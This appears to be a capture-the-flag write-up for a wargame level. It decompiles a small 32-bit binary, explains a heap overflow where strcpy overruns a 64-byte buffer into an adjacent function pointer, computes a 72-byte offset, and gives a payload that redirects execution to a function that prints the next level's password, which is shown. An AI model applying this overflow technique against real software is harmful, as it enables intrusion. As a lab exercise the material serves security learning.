```C
void n(void)
{
    system("/bin/cat /home/user/level7/.pass");
    return;
}



void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)
{
    puts("Nope");
    return;
}



void main(undefined4 param_1, char **argv)
{
    char        *dest;
    undefined4  *puVar1;
    
    dest   = malloc(0x40);
    puVar1 = malloc(4);

    *puVar1 = m;

    strcpy(dest, argv[1]);

    (puVar1)();

    return;
}
```

- dest is a pointer to an address with 64 bytes allocated
- puVar1 is a pointer to a function (4bytes allocated on 32 bits arch)
- strcpy is vulnerable here, we can copy how many bytes we want in dest until overwriting the puVar1 function that point to m() by the n() malicious function.

With ltrace:
- Address of dest  : 0x0804a008
- Address of puVar1: 0x0804a050

So the offset from dest to puVar1 = 0x0804a050 - 0x0804a008 = 0x48 = 72 bytes

-> We can write 72 bytes in dest before reaching puVar1 pointer on the heap and overwrite the the address in puVar1. We will put the address of n()

Address of n() = 0x08048454 (Using nm)

```
Payload: "A"*72 + "0x08048454"
```

```bash
python3 exploit.py

f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```